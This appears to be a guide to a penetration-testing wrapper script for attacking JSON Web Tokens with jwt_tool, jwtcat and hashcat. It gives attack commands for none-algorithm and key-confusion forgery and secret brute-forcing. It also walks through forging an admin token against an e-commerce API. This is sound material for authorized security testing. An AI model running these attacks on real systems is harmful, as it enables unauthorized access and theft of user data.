# 🔥 Professional JWT Tools - Complete Guide

## Overview

This suite integrates **industry-standard professional tools** used by real penetration testers worldwide.

---

## 🛠️ Professional Tools Included

### 1. **jwt_tool** (by ticarpi) ⭐ Most Popular
**Repository**: https://github.com/ticarpi/jwt_tool  
**Stars**: 5.2k+  
**Language**: Python  
**Used by**: OWASP, Bug Bounty Hunters, Professional Pentesters

**What it does:**
- ✅ **Comprehensive vulnerability scanning** (27+ tests)
- ✅ **Token tampering** (None algorithm, RS256 confusion, etc.)
- ✅ **Automated exploitation**
- ✅ **Playbook mode** - Tests all common vulnerabilities
- ✅ **Interactive mode** - Manual claim editing
- ✅ **CVE scanning** (CVE-2015-9235, CVE-2016-5431, etc.)

**Key Features:**
```bash
# All common vulnerabilities (smart mode)
jwt_tool TOKEN -M pb

# None algorithm attack
jwt_tool TOKEN -X a

# Algorithm confusion
jwt_tool TOKEN -X k

# Tamper claims interactively
jwt_tool TOKEN -T

# Scan + Tamper
jwt_tool TOKEN -M at
```

---

### 2. **jwtcat** (by aress31)
**Repository**: https://github.com/aress31/jwtcat  
**Language**: Go  
**Specialty**: High-speed secret bruteforce

**What it does:**
- ✅ **Multi-threaded bruteforce** (very fast!)
- ✅ **Wordlist support** (rockyou.txt, custom lists)
- ✅ **Automatic algorithm detection**
- ✅ **Low memory footprint**

**Usage:**
```bash
# Bruteforce with wordlist
jwtcat -t TOKEN -w /path/to/wordlist.txt

# With threads (faster)
jwtcat -t TOKEN -w wordlist.txt -d 50
```

**Perfect for:**
- Finding weak secrets
- Dictionary attacks
- Fast secret testing

---

### 3. **hashcat** (GPU Bruteforce)
**Official**: https://hashcat.net  
**Specialty**: GPU-accelerated cracking

**What it does:**
- ✅ **GPU acceleration** (1000x faster than CPU)
- ✅ **Dictionary attacks**
- ✅ **Brute force attacks** (mask attacks)
- ✅ **Rule-based attacks**
- ✅ **Hybrid attacks**

**JWT Mode**: `-m 16500` (JWT HS256/384/512)

**Usage:**
```bash
# Dictionary attack
hashcat -m 16500 jwt.txt rockyou.txt

# Brute force (6 lowercase letters)
hashcat -m 16500 jwt.txt -a 3 ?l?l?l?l?l?l

# With rules
hashcat -m 16500 jwt.txt wordlist.txt -r best64.rule
```

**Speed**: Can test **billions of passwords per second** on good GPU!

---

## 🎯 Comparison: Which Tool When?

| Use Case | Tool | Why |
|----------|------|-----|
| **General vulnerability scan** | jwt_tool | Most comprehensive |
| **None algorithm test** | jwt_tool | Built-in |
| **Algorithm confusion** | jwt_tool | Automated |
| **Payload tampering** | jwt_tool | Interactive mode |
| **Secret bruteforce (CPU)** | jwtcat | Fast, lightweight |
| **Secret bruteforce (GPU)** | hashcat | 1000x faster |
| **Production testing (limited requests)** | jwt_tool -M pb | Smart mode |
| **Unknown secret** | hashcat | Fastest |
| **Quick secret test** | jwtcat | Easy to use |

---

## 🚀 JWT Pro Mode Usage

Our **jwt-pro-mode.sh** integrates all three tools!

```bash
bash bin/jwt-pro-mode.sh
```

### Mode 1: jwt_tool All Scan (Recommended)
```
Select: 1
Paste token: eyJhbGciOiJIUzI1NiI...

[*] Running jwt_tool All Scan...

jwt_tool will test:
  ✓ None algorithm (CVE-2015-9235)
  ✓ Algorithm confusion
  ✓ Weak secrets (common)
  ✓ Key injection (kid, jku, x5u)
  ✓ Claims validation
  ✓ Expiration bypass
  ✓ And 20+ more tests...

Result: 10-15 requests, comprehensive findings
```

### Mode 2: jwt_tool Tamper Mode (Manual Control)
```
Select: 2
Paste token: eyJhbGciOiJIUzI1NiI...

Select tamper:
  a) None algorithm
  b) Algorithm confusion
  c) Change claims (interactive)
  d) All tampering

Choose: c

jwt_tool will:
  • Decode token
  • Show all claims
  • Let you edit any claim
  • Generate new token
  • Keep or remove signature
```

### Mode 3: jwtcat Bruteforce (Fast)
```
Select: 3
Paste token: eyJhbGciOiJIUzI1NiI...

Wordlist: wordlists/merged-wordlist-unique.txt
Testing 500,000 secrets...

[+] Secret found: mycompany2024
    Time: 15 seconds
    Token can be forged!
```

### Mode 4: hashcat GPU (Fastest)
```
Select: 4
Paste token: eyJhbGciOiJIUzI1NiI...

Select mode:
  1) Dictionary (wordlist)
  2) Brute force (mask)

Choose: 2
Mask: ?l?l?l?l?l?l (6 lowercase)

Session: hashcat
Status: Cracked
Hash.Type: JWT (HS256/384/512)
Speed: 2.5 GH/s (GPU: RTX 3080)
Recovered: password123
```

### Mode 5: Full Scan (All Tools)
```
Select: 5

[1/3] jwt_tool - Vulnerability scan...
  ✓ None algorithm: NOT vulnerable
  ✓ Algorithm confusion: VULNERABLE!
  ✓ Missing claims: iss, aud
  
[2/3] jwtcat - Quick secrets...
  ✓ Tested 4 common secrets
  ✓ None matched
  
[3/3] jwt_tool - Tamper tests...
  ✓ Generated tampered tokens
  ✓ Ready for testing

Complete report generated.
```

---

## 📊 Professional Testing Workflow

### Step 1: Initial Scan (jwt_tool)
```bash
# Quick vulnerability assessment
bash bin/jwt-pro-mode.sh
# Select: 1 (jwt_tool All Scan)
```

**Gives you:**
- All vulnerabilities found
- Token structure analysis
- Missing claims
- Weak configurations

### Step 2: Secret Testing (jwtcat)
```bash
# If HS256/384/512 algorithm
bash bin/jwt-pro-mode.sh
# Select: 3 (jwtcat)
```

**Tests for:**
- Common secrets
- Company-specific patterns
- Default passwords
- Leaked secrets

### Step 3: Advanced Bruteforce (hashcat) - Optional
```bash
# If secret not found and you have GPU
bash bin/jwt-pro-mode.sh
# Select: 4 (hashcat)
```

**Tries:**
- All wordlist combinations
- Mask attacks (aaa-zzz)
- Hybrid attacks
- Custom patterns

### Step 4: Exploitation (jwt_tool)
```bash
# Create tampered tokens
bash bin/jwt-pro-mode.sh
# Select: 2 (Tamper Mode)
```

**Generates:**
- None algorithm tokens
- RS256 confused tokens
- Modified claim tokens
- Expired tokens extended

### Step 5: Testing Against API
```bash
# Use Burp Suite, curl, or custom scripts
curl -H "Authorization: Bearer [TAMPERED_TOKEN]" https://api.target.com/
```

---

## 🎓 Real-World Example

### Scenario: Bug Bounty on E-commerce Site

**Token found:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4Miwicm9sZSI6InVzZXIifQ.sig
```

**Testing Process:**

1. **jwt_tool scan** (Mode 1)
   ```
   Result: Missing iss, aud claims
   Finding: Algorithm HS256 (symmetric)
   ```

2. **jwtcat bruteforce** (Mode 3)
   ```
   Wordlist: company-passwords.txt
   Result: Secret found "Ecommerce2024!"
   Impact: CRITICAL - Can forge any token!
   ```

3. **jwt_tool tamper** (Mode 2)
   ```
   Original: {"user_id":82,"role":"user"}
   Modified: {"user_id":1,"role":"admin"}
   Secret: Ecommerce2024!
   Generated: eyJhbGciOiJIUzI1NiI...NEW_SIGNATURE
   ```

4. **Test against API**
   ```bash
   curl -H "Authorization: Bearer [NEW_TOKEN]" \
        https://api.shop.com/admin/users
   
   Response: 200 OK
   Body: {"users":[...all users...]}
   ```

5. **Report**
   ```
   Title: JWT Secret Bruteforce + Authorization Bypass
   Severity: CRITICAL
   CVSS: 9.8
   Impact: Full account takeover, admin access
   Steps: [Detailed above]
   Bounty: $5,000
   ```

---

## 🔧 Installation

**Automatic (Recommended):**
```bash
bash bin/jwt-pro-mode.sh
# Will offer to install missing tools automatically
```

**Manual:**
```bash
# jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git ~/.jwt-tools/jwt_tool
cd ~/.jwt-tools/jwt_tool
pip3 install -r requirements.txt

# jwtcat (requires Go)
go install github.com/aress31/jwtcat@latest

# hashcat (requires NVIDIA GPU for best performance)
sudo apt install hashcat
```

---

## 💡 Pro Tips

### jwt_tool Tips:
- Use `-M pb` for smart scanning (avoids rate limits)
- Use `-T` for interactive payload editing
- Use `-M at` for automated exploitation
- Save output: `jwt_tool TOKEN -M pb > report.txt`

### jwtcat Tips:
- Start with small wordlist for quick check
- Use `-d 50` for more threads (faster)
- Create custom wordlists with company names
- Test common patterns: `company2024`, `CompanyName!`

### hashcat Tips:
- Test GPU: `hashcat -I` (should show your GPU)
- Use masks for known patterns: `?u?l?l?l?l?d?d` (Xxxxx00)
- Combine wordlist + rules for best results
- Monitor progress: `hashcat --status`

---

## 🆚 jwt-pro-mode vs jwt-smart-mode

| Feature | Smart Mode | Pro Mode |
|---------|-----------|----------|
| **Tools** | Custom bash scripts | jwt_tool + jwtcat + hashcat |
| **Requests** | Max 15 | Depends on mode |
| **Tests** | 10 priority | 27+ comprehensive |
| **Bruteforce** | 5 common secrets | 500K+ wordlist + GPU |
| **Speed** | Fast | Depends on tool |
| **Use Case** | Production/Rate-limited | Lab/Comprehensive |
| **Industry Standard** | No | Yes (all tools) |

**Recommendation:**
- **Production testing**: Use Smart Mode (limited requests)
- **Lab/Comprehensive**: Use Pro Mode (all tools)
- **Unknown secret**: Use Pro Mode (hashcat)
- **Quick check**: Use either

---

## 📚 Further Reading

**jwt_tool Documentation:**
- https://github.com/ticarpi/jwt_tool/wiki

**JWT Security Best Practices:**
- https://tools.ietf.org/html/rfc8725

**Hashcat Wiki:**
- https://hashcat.net/wiki/

**OWASP JWT Cheat Sheet:**
- https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

---

## ⚠️ Legal Disclaimer

These tools are for authorized security testing only. Always:
- ✅ Get written permission before testing
- ✅ Stay within scope
- ✅ Follow responsible disclosure
- ❌ Never test production without authorization
- ❌ Never use for illegal purposes

---

